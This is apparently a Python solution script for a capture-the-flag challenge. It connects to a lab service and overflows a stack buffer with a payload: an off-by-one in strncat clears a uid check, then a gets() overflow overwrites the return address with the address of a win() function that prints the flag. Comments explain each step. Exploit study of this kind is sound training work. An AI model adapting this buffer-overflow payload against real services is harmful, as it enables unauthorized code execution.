#!/usr/bin/python3

import sys
import socket
import time

#NOTE: relevant non-boilerplate code starts at line 77

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky1"
    port = 13700

s = socket.socket()
s.connect((host, port))


#functions to communicate with server (based on funtions from qual.py)
def dbg_print(txt):
    debug = False
    if debug:
        print(txt.decode('utf-8'))

def recv_until_timed(delim, timeout):
    global s
    if type(delim) is not bytes:
        delim = delim.encode('utf-8')
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while delim not in tmp and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_until(delim):
    return recv_until_timed(delim, 0)

def recv_cnt_timed(count, timeout):
    global s
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while len(tmp) < count and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_cnt(count):
    return recv_cnt_timed(count, 0)

def send(b):
    if type(b) is not bytes:
        b = b.encode('utf-8')
    s.send(b)


# Offset of win() function in binary
# determined with objdump
# little endian
# also PIE is not enabled in vuln binary
win_addr = b"\xd2\x11\x40\x00\x00\x00\x00\x00"

# First fills buffer with 0x40 arbitrary bytes
# this is the may amount of bytes fgets reads
# this is more than the size provided to strncat
# the size provided to strncat does not condider 0 byte added to end
# this causes strncat to partially orverride uid
# since uid is initialized to 1 in little endian, it is 0 afterwards
# the check if(uid) hence fails
# gets then reads user input without any length restriction
#  - (135 byte, aka 2*0x40 + 8 - 1) arbitrary bytes are read to fill stack up to return adress
#  - return address is then overwritten with win_addr
#  - the newline character ends gets()
# the function now returns to win() and hence outputs the flag
send(0x40*b"0" + 135*b"0" + win_addr + b"\n")
recv_until(b'\n').decode()
print(recv_until(b'\n').decode())

